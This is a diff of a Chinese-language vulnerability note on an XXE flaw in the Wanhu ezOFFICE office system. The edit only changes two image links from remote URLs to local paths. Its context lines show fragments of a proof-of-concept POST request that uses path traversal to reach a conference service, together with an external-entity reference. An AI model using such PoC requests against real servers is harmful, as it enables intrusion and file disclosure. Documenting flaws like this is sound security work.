@@ -20,7 +20,7 @@ app="万户网络-ezOFFICE"
 
 产品页面
 
-![1](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202209131048922.png)
+![1](./images/202209131048922.png)
 
 验证POC
 
@@ -33,4 +33,4 @@ POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService
 <value>&xxe;</value>
 ```
 
-![2](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202209131049806.png)
+![2](./images/202209131049806.png)
